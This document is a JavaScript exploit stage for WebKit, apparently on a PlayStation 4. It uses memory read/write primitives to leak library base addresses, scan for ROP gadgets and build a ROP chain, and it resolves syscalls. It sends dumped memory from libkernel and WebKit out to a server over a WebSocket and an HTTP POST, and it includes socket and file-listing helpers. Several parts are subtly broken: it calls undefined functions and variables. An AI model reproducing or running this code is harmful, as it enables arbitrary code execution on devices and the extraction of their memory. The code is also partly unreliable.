var p;

var xhr_sync_log = function(str) {
    "use strict";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, false);
    xhr.send(null);
}
var findModuleBaseXHR = function(addr)
{
    var addr_ = addr.add32(0); // copy
    addr_.low &= 0xFFFFF000;
    xhr_sync_log("START: " + addr_);
    
    while (1) {
        var vr = p.read4(addr_.add32(0x110-4));
        xhr_sync_log("step" + addr_);
        addr_.sub32inplace(0x1000);
    }
}
var log = function(x) {
    document.getElementById("console").innerText += x + "\n";
}
var print = function(string) { // like log but html
    document.getElementById("console").innerHTML += string + "\n";
}

var dumpModuleXHR = function(moduleBase) {
    var chunk = new ArrayBuffer(0x1000);
    var chunk32 = new Uint32Array(chunk);
    var chunk8 = new Uint8Array(chunk);
    connection = new WebSocket('ws://10.17.0.1:8080');
    connection.binaryType = "arraybuffer";
    var helo = new Uint32Array(1);
    helo[0] = 0x41414141;
    
    var moduleBase_ = moduleBase.add32(0);
    connection.onmessage = function() {
        try {
            for (var i = 0; i < chunk32.length; i++)
            {
                var val = p.read4(moduleBase_);
                chunk32[i] = val;
                moduleBase_.add32inplace(4);
            }
            connection.send(chunk8);
        } catch (e) {
            print(e);
        }
    }
}
var get_jmptgt = function(addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));

  if (z != 0x25FF) return 0;
  
  return addr.add32(y + 6);
}



var reenter_help = { length:
    { valueOf: function(){
        return 0;
    }
}};


window.stage2 = function() {
    try {
        window.stage2_();
    } catch (e) {
        print(e);
    }
}
/* For storing the gadget and import map */
window.GadgetMap = [];
window.slowpath_jop = [];

/* All function stubs / imports from other modules */
var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];

var gadgetmap_wk = {
    "ep": [0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3],
    "pop rsi": [0x5E, 0xC3],
    "pop rdi": [0x5F, 0xC3],
    "pop rsp": [0x5c, 0xC3],
    "pop rax": [0x58, 0xC3],
    "pop rdx": [0x5a, 0xC3],
    "pop rcx": [0x59, 0xC3],
    "pop rsp": [0x5c, 0xC3],
    "pop rbp": [0x5d, 0xC3],
    "pop r8": [0x47, 0x58, 0xC3],
    "pop r9": [0x47, 0x59, 0xC3],
    "infloop": [0xEB, 0xFE, 0xc3],
    "ret": [0xC3],
    "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xC3], // mov qword [rdi], rsi ; ret  ;
    "mov [rax], rsi": [0x48, 0x89, 0x30, 0xC3],
    "mov [rdi], rax": [0x48, 0x89, 0x07, 0xC3],
    "mov rxa, rdi": [0x48, 0x89, 0xF8, 0xC3]
};

var gadgetcache = {"ret":28670292,"ep":173,"pop rbp":29426521,"pop rax":32929053,"mov rax, rdi":150773,"pop r8":100517,"pop rsp":128173,"mov [rdi], rsi":150754,"pop rcx":30846545,"pop rdi":30834737,"pop rsi":32929065,"mov [rdi], rax":782172,"jop":813600,"pop rdx":32929057,"mov [rax], rsi":2484823,"pop r9":21430127,"infloop":22604906}, gadgetoffs = {};

window.stage2_ = function() {
    p = window.prim;
    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    }
 gadgetconn = 0;
    if (!gadgetcache)
        gadgetconn = new WebSocket('ws://10.17.0.1:8080');

    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    print("libwebkit base at: 0x" + webKitBase);
    
    var o2wk = function(o)
    {
        return webKitBase.add32(o);
    }

    gadgets = {
        "stack_chk_fail": o2wk(0xc8),
        "memset": o2wk(0x228),
        "setjmp": o2wk(0x14f8)
    };
   

    var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets['stack_chk_fail']));
    libSceLibcInternalBase.low &= ~0x3FFF;
    libSceLibcInternalBase.sub32inplace(0x20000);
    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
    window.libSceLibcInternalBase = libSceLibcInternalBase;

    var jmpGadget = get_jmptgt(gadgets.stack_chk_fail);
    if(!jmpGadget)
        return;

    var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    print("libkernel_web base at: 0x" + libKernelBase);
    
    
    var o2lk = function(o)
    {
        return libKernelBase.add32(o);
    }
    window.o2lk = o2lk;
    
    var wkview = new Uint8Array(0x1000);
    var wkstr = p.leakval(wkview).add32(0x10);
    var orig_wkview_buf = p.read8(wkstr);
    
    p.write8(wkstr, webKitBase);
    p.write4(wkstr.add32(8), 0x367c000);
    
    var gadgets_to_find = 0;
    var gadgetnames = [];
    for (var gadgetname in gadgetmap_wk) {
        if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
            gadgets_to_find++;
            gadgetnames.push(gadgetname);
            gadgetmap_wk[gadgetname].reverse();
        }
    }
    log("finding gadgets");
    
    gadgets_to_find++; // slowpath_jop
    var findgadget = function(donecb) {
        if (gadgetcache)
        {
            gadgets_to_find=0;
            slowpath_jop=0;
            log("using gadgets");
            
            for (var gadgetname in gadgetcache) {
                if (gadgetcache.hasOwnProperty(gadgetname)) {
                    gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
                }
            }
            
        } else {
            for (var i=0; i < wkview.length; i++)
            {
                if (wkview[i] == 0xc3)
                {
                    for (var nl=0; nl < gadgetnames.length; nl++)
                    {
                        var found = 1;
                        if (!gadgetnames[nl]) continue;
                        var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
                        for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++)
                        {
                            if (gadgetbytes[compareidx] != wkview[i - compareidx]){
                                found = 0;
                                break;
                            }
                        }
                        if (!found) continue;
                        gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
                        
                        delete gadgetnames[nl];
                        gadgets_to_find--;
                    }
                } else if (wkview[i] == 0xe0 && wkview[i-1] == 0xff && slowpath_jop)
                {
                    var found = 1;
                    for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++)
                    {
                        if (slowpath_jop[compareidx] != wkview[i - compareidx])
                        {
                            found = 0;
                            break;
                        }
                    }
                    if (!found) continue;
                    gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
                    gadgetoffs["jop"] = i - slowpath_jop.length + 1;
                    gadgets_to_find--;
                    slowpath_jop = 0;
                }
                
                if (!gadgets_to_find) break;
            }
        }
        if (!gadgets_to_find && !slowpath_jop) {
            log("found gadgets");
            if (gadgetconn)
                gadgetconn.onopen = function(e){
                    gadgetconn.send(JSON.stringify(gadgetoffs));
                }
                setTimeout(donecb, 50);
        } else {
            log("missing gadgets: ");
            for (var nl in gadgetnames) {
                log(" - " + gadgetnames[nl]);
            }
            if(slowpath_jop) log(" - jop gadget");
        }
    }
  // Setup ROP launching
    findgadget(function(){});
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {a:0, b:0, c:0, d:0};
      hold2 = {a:0, b:0, c:0, d:0};
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) break;
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var funcbuf;

    var launch_chain = function(chain)
    {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;
        
        var reenter_help = {length: {valueOf: function(){
            orig_reenter_rip = p.read8(stackPointer);
            stackCookie = p.read8(stackPointer.add32(8));
            var returnToFrame = stackPointer;
            
            var ocnt = chain.count;
            chain.push_write8(stackPointer, orig_reenter_rip);
            chain.push_write8(stackPointer.add32(8), stackCookie);
            
            if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
            
            chain.push(gadgets["pop rsp"]); // pop rsp
            chain.push(returnToFrame); // -> back to the trap life
            chain.count = ocnt;
            
            p.write8(stackPointer, (gadgets["pop rsp"])); // pop rsp
            p.write8(stackPointer.add32(8), chain.ropframeptr); // -> rop frame
        }}};
        
        var funcbuf32 = new Uint32Array(0x100);
        nogc.push(funcbuf32);
        funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
        
        p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
        p.write8(funcbuf.add32(0x80), gadgets["jop"]);
        p.write8(funcbuf,funcbuf);
        p.write8(parseFloatStore, gadgets["jop"]);
        var orig_hold = p.read8(holdz1);
        var orig_hold48 = p.read8(holdz1.add32(0x48));
        
        p.write8(holdz1, funcbuf.add32(0x50));
        p.write8(holdz1.add32(0x48), funcbuf);
        parseFloat(hold2,hold2,hold2,hold2,hold2,hold2);
        p.write8(holdz1, orig_hold);
        p.write8(holdz1.add32(0x48), orig_hold48);
        
        stackPointer = p.read8(funcbuf.add32(0x10));
        rtv=Array.prototype.splice.apply(reenter_help);
        return p.leakval(rtv);
    }

    p.loadchain = launch_chain;
  
    
    // Write to address with value (helper function)
    this.write64 = function (addr, val) {
        this.push(window.gadgets["pop rdi"]);
        this.push(addr);
        this.push(window.gadgets["pop rax"]);
        this.push(val);
        this.push(window.gadgets["mov [rdi], rax"]);
    }

    this.write32 = function(addr, val) {
        this.write16(addr, val & 0xFFFF);
        this.write16(addr.add32(0x2), (val >> 0x10) & 0xFFFF);
    }

    this.write16 = function(addr, val) {
        p.write8(addr, val & 0xFF)
        p.write8(addr.add32(0x1), (val >> 8) & 0xFF);
    }

    this.write_data = function(addr, u32array) {
        for (var i = 0; i < u32array.length; i++) {
            this.write32(addr.add32(i * 4), u32array[i]);
        }
    }

    this.write_str = function(addr, str) {
        for (var i = 0; i < str.length; i++) {
            p.write8(addr.add32(i), str.charCodeAt(i));
        }
    }
   
    window.RopChain = function () {
        this.ropframe = new Uint32Array(0x10000);
        this.ropframeptr = p.read8(p.leakval(this.ropframe).add32(0x10));
        this.count = 0;
        this.clear = function() {
            this.count = 0;
            this.runtime = undefined;
            for (var i = 0; i < 0x1000/8; i++)
            {
                p.write8(this.ropframeptr.add32(i*8), 0);
            }
        };
        this.pushSymbolic = function() {
            this.count++;
            return this.count-1;
        }
        this.finalizeSymbolic = function(idx, val) {
            p.write8(this.ropframeptr.add32(idx*8), val);
        }
        this.push = function(val) {
            this.finalizeSymbolic(this.pushSymbolic(), val);
        }
         this.push_write8 = function(where, what)
  {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(where); // where
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(what); // what
      this.push(gadgets["mov [rdi], rsi"]); // perform write
  }
       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(rdi); // what
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(rsi); // what
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]); // pop rdx
      this.push(rdx); // what
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]); // pop r10
      this.push(rcx); // what
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]); // pop r8
      this.push(r8); // what
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]); // pop r9
      this.push(r9); // what*/
    }

    this.push(rip); // jmp
    return this;
  }
        
        this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
  }
  
  return this;
};
    var RopChain = window.RopChain();
    window.syscallnames = {"exit": 1,
    "fork": 2,
    "read": 3,
    "write": 4,
    "open": 5,
    "close": 6,
    "wait4": 7,
    "unlink": 10,
    "chdir": 12,
    "chmod": 15,
    "getpid": 20,
    "setuid": 23,
    "getuid": 24,
    "geteuid": 25,
    "recvmsg": 27,
    "sendmsg": 28,
    "recvfrom": 29,
    "accept": 30,
    "getpeername": 31,
    "getsockname": 32,
    "access": 33,
    "chflags": 34,
    "fchflags": 35,
    "sync": 36,
    "kill": 37,
    "stat": 38,
    "getppid": 39,
    "dup": 41,
    "pipe": 42,
    "getegid": 43,
    "profil": 44,
    "getgid": 47,
    "getlogin": 49,
    "setlogin": 50,
    "sigaltstack": 53,
    "ioctl": 54,
    "reboot": 55,
    "revoke": 56,
    "execve": 59,
    "execve": 59,
    "msync": 65,
    "munmap": 73,
    "mprotect": 74,
    "madvise": 75,
    "mincore": 78,
    "getgroups": 79,
    "setgroups": 80,
    "setitimer": 83,
    "getitimer": 86,
    "getdtablesize": 89,
    "dup2": 90,
    "fcntl": 92,
    "select": 93,
    "fsync": 95,
    "setpriority": 96,
    "socket": 97,
    "connect": 98,
    "accept": 99,
    "getpriority": 100,
    "send": 101,
    "recv": 102,
    "bind": 104,
    "setsockopt": 105,
    "listen": 106,
    "recvmsg": 113,
    "sendmsg": 114,
    "gettimeofday": 116,
    "getrusage": 117,
    "getsockopt": 118,
    "readv": 120,
    "writev": 121,
    "settimeofday": 122,
    "fchmod": 124,
    "recvfrom": 125,
    "setreuid": 126,
    "setregid": 127,
    "rename": 128,
    "flock": 131,
    "sendto": 133,
    "shutdown": 134,
    "socketpair": 135,
    "mkdir": 136,
    "rmdir": 137,
    "utimes": 138,
    "adjtime": 140,
    "getpeername": 141,
    "setsid": 147,
    "sysarch": 165,
    "setegid": 182,"seteuid": 183,
    "stat": 188,
    "fstat": 189,
    "lstat": 190,
    "pathconf": 191,
    "fpathconf": 192,
    "getrlimit": 194,
    "setrlimit": 195,
    "getdirentries": 196,
    "__sysctl": 202,
    "mlock": 203,
    "munlock": 204,
    "futimes": 206,
    "poll": 209,
    "clock_gettime": 232,
    "clock_settime": 233,
    "clock_getres": 234,
    "ktimer_create": 235,
    "ktimer_delete": 236,
    "ktimer_settime": 237,
    "ktimer_gettime": 238,
    "ktimer_getoverrun": 239,
    "nanosleep": 240,
    "rfork": 251,
    "issetugid": 253,
    "getdents": 272,
    "preadv": 289,
    "pwritev": 290,
    "getsid": 310,
    "aio_suspend": 315,
    "mlockall": 324,
    "munlockall": 325,
    "sched_setparam": 327,
    "sched_getparam": 328,
    "sched_setscheduler": 329,
    "sched_getscheduler": 330,
    "sched_yield": 331,
    "sched_get_priority_max": 332,
    "sched_get_priority_min": 333,
    "sched_rr_get_interval": 334,
    "utrace": 335,
    "sigprocmask": 340,
    "sigsuspend": 341,
    "sigpending": 343,
    "sigtimedwait": 345,
    "sigwaitinfo": 346,
    "kqueue": 362,
    "kevent": 363,
    "uuidgen": 392,
    "sendfile": 393,
    "fstatfs": 397,
    "ksem_close": 400,
    "ksem_post": 401,
    "ksem_wait": 402,
    "ksem_trywait": 403,
    "ksem_init": 404,
    "ksem_open": 405,
    "ksem_unlink": 406,
    "ksem_getvalue": 407,
    "ksem_destroy": 408,
    "sigaction": 416,
    "sigreturn": 417,
    "getcontext": 421,
    "setcontext": 422,
    "swapcontext": 423,
    "sigwait": 429,
    "thr_create": 430,
    "thr_exit": 431,
    "thr_self": 432
    ,"thr_kill": 433,
    "ksem_timedwait": 441,
    "thr_suspend": 442,
    "thr_wake": 443,
    "kldunloadf": 444,
    "_umtx_op": 454,
    "thr_new": 455,
    "sigqueue": 456,
    "thr_set_name": 464,
    "rtprio_thread": 466,
    "pread": 475,
    "pwrite": 476,
    "mmap": 477,
    "lseek": 478,
    "truncate": 479,
    "ftruncate": 480,
    "thr_kill2": 481,
    "shm_open": 482,
    "shm_unlink": 483,
    "cpuset_getid": 486,
    "cpuset_getaffinity": 487,
    "cpuset_setaffinity": 488,
    "openat": 499,
    "pselect": 522,  
    "regmgr_call": 532,
    "jitshm_create": 533,
    "jitshm_alias": 534,
    "dl_get_list": 535,
    "dl_get_info": 536,
    "dl_notify_event": 537,
    "evf_create": 538,
    "evf_delete": 539,
    "evf_open": 540,
    "evf_close": 541,
    "evf_wait": 542,
    "evf_trywait": 543,
    "evf_set": 544,
    "evf_clear": 545,
    "evf_cancel": 546,
    "query_memory_protection": 47,
    "batch_map": 548,
    "osem_create": 549,
    "osem_delete": 550,
    "osem_open": 551,
    "osem_close": 552,
    "osem_wait": 553,
    "osem_trywait": 554,
    "osem_post": 555,
    "sys_osem_cancel": 556,
    "namedobj_create": 557,
    "namedobj_delete": 558,
    "set_vm_container": 559,
    "debug_init": 560,
    "suspend_process": 561,
    "resume_process": 562,
    "opmc_enable": 563,
    "opmc_disable": 564,
    "opmc_set_ctl": 565,
    "opmc_set_ctr": 566,
    "opmc_get_ctr": 567,
    "budget_create": 568,
    "budget_delete": 569,
    "budget_get": 570,
    "budget_set": 571,
    "virtual_query": 572,
    "mdbg_call": 573,
    "sblock_create": 574,
    "sblock_delete": 575,
    "sblock_enter": 576,
    "sblock_exit": 577,
    "sblock_xenter": 578,
    "sblock_xexit": 579,
    "eport_create": 580,
    "eport_delete": 581,
    "eport_trigger": 582,
    "eport_open": 583,
    "eport_close": 584,
    "is_in_sandbox": 585,
    "dmem_container": 586,
    "get_authinfo": 587,
    "mname": 588,
    "dynlib_dlopen": 589,
    "dynlib_dlclose": 590,
    "dynlib_dlsym": 591,
    "dynlib_get_list": 592,
    "dynlib_get_info": 593,
    "dynlib_load_prx": 594,
    "dynlib_unload_prx": 595,
    "dynlib_do_copy_relocations": 596,
    "dynlib_prepare_dlclose": 597,
    "dynlib_get_proc_param": 598,
    "dynlib_process_needed_and_relocate": 599,
    "sandbox_path": 600,
    "mdbg_service": 601,
    "randomized_path": 602,
    "rdup": 603,
    "dl_get_metadata": 604,
    "workaround8849": 605,
    "is_development_mode": 606,
    "get_self_auth_info": 607,
    "dynlib_get_info_ex": 608,
    "budget_get_ptype": 610,
    "budget_getid": 609,
    "get_paging_stats_of_all_threads": 611,
    "get_proc_type_info": 612,
    "get_resident_count": 613,
    "prepare_to_suspend_process": 614,
    "get_resident_fmem_count": 615,
    "thr_get_name": 616,
    "set_gpo": 617,
    "thr_suspend_ucontext": 632,
    "thr_resume_ucontext": 633,
    "thr_get_ucontext": 634}    


       /* Get syscall name by index */
function swapkeyval(json){
  var ret = {};
  for(var key in json){
    if (json.hasOwnProperty(key)) {
      ret[json[key]] = key;
    }
  }
  return ret;
}
    
    window.nameforsyscall = swapkeyval(window.syscallnames);
    
    window.syscalls = {};
    
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    
    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000); // high enough lel
    
    var countbytes;
    for (var i=0; i < 0x40000; i++)
    {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
        {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i=0; i < countbytes; i++)
    {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
        {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    var chain = new window.RopChain;
    
    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
        chain.clear();
        
        chain.notimes = this.next_notime;
        this.next_notime = 1;
        
        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        
        chain.push(window.gadgets["pop rdi"]); // pop rdi
        chain.push(chain.ropframeptr.add32(0x3ff8)); // where
        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
        
        chain.push(window.gadgets["pop rax"]); // pop rax
        chain.push(p.leakval(0x41414242)); // where
        
        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
        return returnvalue = p.read8(chain.ropframeptr.add32(0x3ff8)); //p.read8(chain.ropframeptr.add32(0x3ff8));
    }
    
    
    p.readstr = function(addr){
        var addr_ = addr.add32(0); // copy
        var rd = p.read4(addr_);
        var buf = "";
        while (rd & 0xFF)
        {
            buf += String.fromCharCode(rd & 0xFF);
            addr_.add32inplace(1);
            rd = p.read4(addr_);
        }
        return buf;
    }
    
    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
    {
        if (typeof sysc == "string") {
            sysc = window.syscallnames[sysc];
        }
        if (typeof sysc != "number") {
            throw new Error("invalid syscall");
        }
        
        var off = window.syscalls[sysc];
        if (off == undefined)
        {
            throw new Error("invalid syscall");
        }
        
        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
    }


    p.sptr = function(str) {
        var bufView = new Uint8Array(str.length+1);
        for (var i=0; i<str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    };
    
    log("loaded sycalls");

    function memDump(address, size, fileName, writeContinue) {
        if (ArrayBuffer.isView(address) || address instanceof ArrayBuffer) {
            address = this.getArrayBufferAddr(address);
        }
        var totalSize = size;
        var idx = 0;
        var view = new Int32Array(Math.round(size/4));
        var i = 0;
    
        for (var idx = 0; idx < totalSize; idx += 0x08) {
            var chain = p.read8(address);
            view[i++] = chain.low;
            view[i++] = chain.hi;
            address = address.add32(0x08); 
        }

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'dump.jss', true);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.setRequestHeader('Content-Disposition', fileName || "dump.bin");
        if (writeContinue !== false) xhr.setRequestHeader('Write-Continue', "true");
        xhr.send(view);
    };
    
    function dump(module) {
        var size1KB = (0x10 * 64) * 1;
        var size16KB = (0x10 * 64) * 16;
        var size32KB = (0x10 * 64) * 32;
        var size64KB = (0x10 * 64) * 64;
        var size128KB = (0x10 * 64) * 128;
        var size512KB = (0x10 * 64) * 128 * 4;
        var size1MB = (0x10 * 64) * 128 * 8;

        if (module === 'libkernel') {
            memDump(window.libKernelBase, 330000, `libkernel.sprx`, false);
        } else if (module === 'libSceWebKit2') {
            memDump(window.webKitBase, 44340152, `libSceWebKit2.sprx`, false);
        }
    }

    dump('libkernel');
    dump('libSceWebKit2');

    var rtv1 = p.fcall(window.gadgets["mov rax, rdi"], 0x41414141);
    var pid = p.syscall("getpid");
    var uid = p.syscall("getuid");
    print("all good. fcall test retval = " + rtv1 + " - uid: " + uid + " - pid: " + pid);

    function getlogin() {
        p.syscall("getlogin", this.ropframeptr, 17);
        print("getlogin() returned " + p.readstr(this.ropframeptr));
    }

    getlogin();

    window.socket_test = function(){
        var s = socket();
        print('socket() returned 0x' + s.toString(16));

        var c = connect(s, "192.168.1.20", 80);
        print('connect() returned 0x' + c.toString(16));

        var str_to_write = "Hello From a PS4!\n";
        write_str(ropframeptr, str_to_write);

        var bytes_written = write(s, ropframeptr, str_to_write.length);
        print('write() returned 0x' + bytes_written.toString(16));
    }

    print("<a href=javascript:window.socket_test()>socket test</a>");

    window.ls = function(path)
    {
        var lsscrtch32 = new Uint32Array(0x400);
        var lsscrtch = p.read8(p.leakval(lsscrtch32).add32(0x10));

        var sep = "/"
        if (path[path.length-1]=="/") sep = "";

        var fd = p.syscall("open", p.sptr(path), 0x1100004).low;

        if (fd == (-1 >>> 0))
        {
            print("open("+path+"): -1");

            return;
        }
        print("Directory listing for " +path+":");
        var total = p.syscall("getdents", fd, lsscrtch, 0x1000).low;
        if (total == (-1 >>> 0))
        {
            print("getdents("+path+"): -1");
            return;
        }

        var offset = 0;
        while (offset < total)
        {
            var cur = lsscrtch.add32(offset);
            var reclen = p.read4(cur.add32(4)) & 0xFFFF;
            var filepath = path + sep + p.readstr(cur.add32(8));
            print("<a href=javascript:window.ls('" + filepath + "');>" + filepath + "</a>");
            offset += reclen;
            if(!reclen) break;
        }
        p.syscall("close", fd);
    }
    print("<a href=javascript:window.ls('/');>ls /</a>");
}
